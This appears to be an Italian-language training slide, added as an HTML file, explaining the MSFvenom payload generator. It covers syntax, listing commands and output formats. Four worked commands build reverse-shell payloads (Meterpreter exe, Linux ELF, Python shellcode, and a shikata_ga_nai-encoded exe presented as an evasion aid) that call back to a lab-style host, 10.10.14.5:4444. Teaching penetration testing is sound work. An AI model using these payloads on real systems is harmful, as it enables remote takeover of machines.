@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <title>MSFvenom - Payload Generator</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="nav-buttons">
+        <div class="nav-btn" id="nav-menu"><svg viewBox="0 0 24 24"><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg></div>
+        <div class="nav-btn" id="nav-prev"><svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"></polyline></svg></div>
+        <div class="nav-btn" id="nav-next"><svg viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"></polyline></svg></div>
+    </div>
+
+    <div class="container">
+        <h1 class="title">🔨 MSFvenom</h1>
+        <div class="subtitle">Generatore di payload standalone</div>
+
+        <div class="card border-blue" style="margin-bottom: 25px;">
+            <div class="card-title">🎯 Cos'è MSFvenom?</div>
+            <div class="card-text">
+                <p><strong>MSFvenom</strong> è lo strumento unificato (post-2015) per la generazione di payload e encoding, combinando le funzionalità di msfpayload e msfencode.</p>
+                <br>
+                <p><strong>Utilizzo principale:</strong></p>
+                <ul style="margin-top: 10px; line-height: 1.8;">
+                    <li>Generare payload standalone (exe, dll, elf, etc.)</li>
+                    <li>Creare shellcode per exploit custom</li>
+                    <li>Encodare payload per evasione/compatibilità</li>
+                    <li>Trasformare payload in diversi formati di output</li>
+                </ul>
+            </div>
+        </div>
+
+        <div class="grid-2-col">
+            <div class="card border-green">
+                <div class="card-title">📝 Sintassi Base</div>
+                <div class="card-text">
+                    <div class="code-box">$ msfvenom -p &lt;payload&gt; &lt;options&gt; -f &lt;format&gt; -o &lt;output&gt;</div>
+                    <br>
+                    <p><strong>Parametri principali:</strong></p>
+                    <ul style="margin-top: 10px; line-height: 1.8;">
+                        <li><span class="tech-term">-p</span> - Payload da usare</li>
+                        <li><span class="tech-term">-f</span> - Formato output (exe, elf, python, etc.)</li>
+                        <li><span class="tech-term">-o</span> - File di output</li>
+                        <li><span class="tech-term">-e</span> - Encoder da utilizzare</li>
+                        <li><span class="tech-term">-i</span> - Iterazioni encoding</li>
+                        <li><span class="tech-term">-b</span> - Bad characters da evitare</li>
+                        <li><span class="tech-term">-a</span> - Architettura target</li>
+                        <li><span class="tech-term">--platform</span> - Piattaforma target</li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="card border-purple">
+                <div class="card-title">🚀 Comandi Utili</div>
+                <div class="card-text">
+                    <p><strong>Listare payloads:</strong></p>
+                    <div class="code-box">$ msfvenom -l payloads
+$ msfvenom -l payloads | grep meterpreter</div>
+                    <br>
+                    <p><strong>Listare formati:</strong></p>
+                    <div class="code-box">$ msfvenom -l formats</div>
+                    <br>
+                    <p><strong>Listare encoders:</strong></p>
+                    <div class="code-box">$ msfvenom -l encoders</div>
+                    <br>
+                    <p><strong>Opzioni payload specifico:</strong></p>
+                    <div class="code-box">$ msfvenom -p windows/meterpreter/reverse_tcp --list-options</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="card border-yellow" style="margin-top: 25px;">
+            <div class="card-title">🎪 Esempi Pratici</div>
+            <div class="card-text">
+                <p><strong>1. Windows EXE - Reverse Shell Meterpreter:</strong></p>
+                <div class="code-box">$ msfvenom -p windows/x64/meterpreter/reverse_tcp \
+  LHOST=10.10.14.5 LPORT=4444 \
+  -f exe -o shell.exe</div>
+                <br>
+                <p><strong>2. Linux ELF - Reverse Shell:</strong></p>
+                <div class="code-box">$ msfvenom -p linux/x64/shell_reverse_tcp \
+  LHOST=10.10.14.5 LPORT=4444 \
+  -f elf -o shell.elf</div>
+                <br>
+                <p><strong>3. Python Shellcode:</strong></p>
+                <div class="code-box">$ msfvenom -p windows/meterpreter/reverse_tcp \
+  LHOST=10.10.14.5 LPORT=4444 \
+  -f python</div>
+                <br>
+                <p><strong>4. Con encoding e bad characters:</strong></p>
+                <div class="code-box">$ msfvenom -p windows/shell_reverse_tcp \
+  LHOST=10.10.14.5 LPORT=4444 \
+  -b "\x00\x0a\x0d" \
+  -e x86/shikata_ga_nai -i 5 \
+  -f exe -o encoded_shell.exe</div>
+            </div>
+        </div>
+
+        <div class="card border-red" style="margin-top: 25px;">
+            <div class="card-title">📋 Formati di Output Popolari</div>
+            <div class="card-text">
+                <div class="grid-3-col">
+                    <div>
+                        <p><strong>Eseguibili:</strong></p>
+                        <ul style="line-height: 1.8;">
+                            <li><span class="tech-term">exe</span> - Windows</li>
+                            <li><span class="tech-term">elf</span> - Linux</li>
+                            <li><span class="tech-term">macho</span> - MacOS</li>
+                            <li><span class="tech-term">dll</span> - Windows DLL</li>
+                        </ul>
+                    </div>
+                    <div>
+                        <p><strong>Shellcode:</strong></p>
+                        <ul style="line-height: 1.8;">
+                            <li><span class="tech-term">c</span> - C code</li>
+                            <li><span class="tech-term">python</span> - Python</li>
+                            <li><span class="tech-term">raw</span> - Binary</li>
+                            <li><span class="tech-term">hex</span> - Hex string</li>
+                        </ul>
+                    </div>
+                    <div>
+                        <p><strong>Script:</strong></p>
+                        <ul style="line-height: 1.8;">
+                            <li><span class="tech-term">vba</span> - VBA macro</li>
+                            <li><span class="tech-term">powershell</span> - PS</li>
+                            <li><span class="tech-term">asp</span> - ASP</li>
+                            <li><span class="tech-term">jsp</span> - JSP</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>const slideNumero = 20;</script>
+    <script src="main.js"></script>
+</body>
+</html>
